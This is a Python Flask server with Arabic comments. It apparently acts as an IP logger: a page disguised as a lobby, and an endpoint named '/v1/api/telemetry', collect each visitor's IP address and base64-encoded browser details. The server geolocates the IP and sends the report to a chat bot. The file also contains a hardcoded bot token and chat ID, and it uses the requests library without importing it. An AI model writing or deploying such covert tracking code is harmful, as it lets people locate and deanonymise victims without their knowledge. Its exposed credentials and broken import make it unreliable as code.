from flask import Flask, render_template, request, jsonify
from core.bot_handler import MatrixBot
import base64

app = Flask(__name__)

# فك تشفير البيانات وقت العمل فقط
TOKEN = "8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM"
CID = "1772820433"
bot = MatrixBot(TOKEN, CID)

@app.route('/')
def lobby():
    return render_template('index.html')

@app.route('/v1/api/telemetry', methods=['POST'])
def capture():
    raw_data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # فك تشفير البيانات القادمة من الجافا سكربت
    ua = base64.b64decode(raw_data['f']).decode('utf-8')
    
    # جلب معلومات الموقع
    geo = requests.get(f"http://ip-api.com/json/{ip}").json()
    
    report = {
        "ip": ip, "ua": ua, "city": geo.get('city'), 
        "country": geo.get('country'), "isp": geo.get('isp')
    }
    
    bot.send_report(report)
    return jsonify({"status": "delivered"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
